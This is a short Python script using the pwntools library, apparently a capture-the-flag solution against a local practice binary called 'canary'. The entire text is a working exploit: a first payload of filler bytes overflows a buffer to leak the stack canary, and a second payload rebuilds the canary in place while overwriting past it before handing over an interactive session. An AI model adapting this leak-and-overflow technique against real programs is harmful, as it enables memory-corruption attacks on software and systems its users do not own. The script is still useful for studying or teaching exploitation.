from pwn import *

p = process("./canary")

payload = b"A" * 104
print(p.recvuntil(": "))
p.sendline(b'1')
print(p.recvuntil(": "))
p.sendline(payload)
p.recvline()
canary = u64(p.recvline().strip().ljust(8,b"\x00"))
print(f"Canary: {hex(canary)}")

print(p.recvuntil(": "))


payload2 = b"A" * 100 + b"\x00"*5 + p64(canary) + b"B"*12

p.sendline(payload2)
p.interactive()
